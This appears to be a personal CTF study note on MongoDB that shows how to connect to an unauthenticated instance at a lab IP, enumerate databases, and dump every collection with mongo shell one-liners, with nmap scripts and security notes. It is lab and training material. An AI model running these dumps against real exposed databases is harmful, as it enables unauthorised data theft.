---
tags: [database, mongodb]
---

> **MongoDB** is a NoSQL document database running on **port 27017**. By default it has no authentication, making it a high-value target for data exfiltration in CTFs. This guide covers what we've practiced.

---

## Quickstart — Unauthenticated access

```bash
# Connect to MongoDB without credentials (mongosh — modern shell)
$ mongosh mongodb://10.129.1.10:27017
test> show dbs

# Legacy mongo shell (common in older versions)
$ mongo 10.129.1.10:27017
> show dbs
```

---

## Basic enumeration

```bash
$ mongo 10.129.1.10:27017

# List databases
> show dbs
> db.adminCommand({listDatabases: 1})

# Switch databases
> use admin
> use sensitive_information

# Show current database
> db
> db.getName()

# List collections
> show collections
> db.getCollectionNames()

# Check server version
> db.version()
```

### Dumping data

```bash
# Inside interactive shell
> use sensitive_information
> db.getCollectionNames()
> db.flag.find().pretty()
> db.users.find().pretty()

# With --eval (one-liner, no interaction)
$ mongo 10.129.1.10:27017/sensitive_information --eval 'db.flag.find().forEach(printjson)'

# Dump ALL collections from ALL databases
$ mongo --quiet 10.129.1.10:27017 --eval '
  db.adminCommand({listDatabases: 1}).databases.forEach(function(d) {
    print("=== " + d.name + " ===");
    var dbObj = db.getSiblingDB(d.name);
    dbObj.getCollectionNames().forEach(function(c) {
      print("  --- " + c + " ---");
      dbObj.getCollection(c).find().forEach(printjson)
    })
  })
'
```

---

## MongoDB Commands Cheat Sheet

### Database Operations

| Command | What it does |
| :------ | :------ |
| `show dbs` | List all databases |
| `use <db>` | Switch to / create a database |
| `db` | Show current database name |
| `db.getName()` | Same as `db` |

### Collection Operations

| Command | What it does |
| :------ | :------ |
| `show collections` | List collections in current DB |
| `db.getCollectionNames()` | Same as above, returns array |

### Reading data

| Command | What it does |
| :------ | :------ |
| `db.<col>.find().pretty()` | Dump all documents (pretty-printed) |
| `db.<col>.findOne()` | Return the first document |
| `db.<col>.find({key: "value"})` | Filter by field |
| `db.<col>.countDocuments()` | Count documents |

---

## Useful Nmap Scripts

```bash
# Detect MongoDB + enumerate databases (most useful script)
nmap --script mongodb-databases -p27017 10.129.1.10

# List MongoDB info
nmap --script mongodb-info -p27017 10.129.1.10
```

---

## MongoDB Security Notes

- **No auth by default** — MongoDB ≤ 3.6 ships with `authorization: disabled` in `/etc/mongod.conf`
- `bindIp` defaults to `127.0.0.1` in newer versions, but many admins change it to `0.0.0.0` and forget to enable auth
- We saw it on: **Mongod** (MongoDB 3.6.8, no auth, flag in `sensitive_information.flag`)

---

## 🔗 Related

**Machines:** [[👹 Mongod]]

**Guides:** [[🗄️ Redis]]

---

## References

- [MongoDB Official Documentation](https://www.mongodb.com/docs/manual/)
- [HackTricks — Pentesting MongoDB (27017)](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)
- [Nmap NSE — mongodb-databases](https://nmap.org/nsedoc/scripts/mongodb-databases.html)
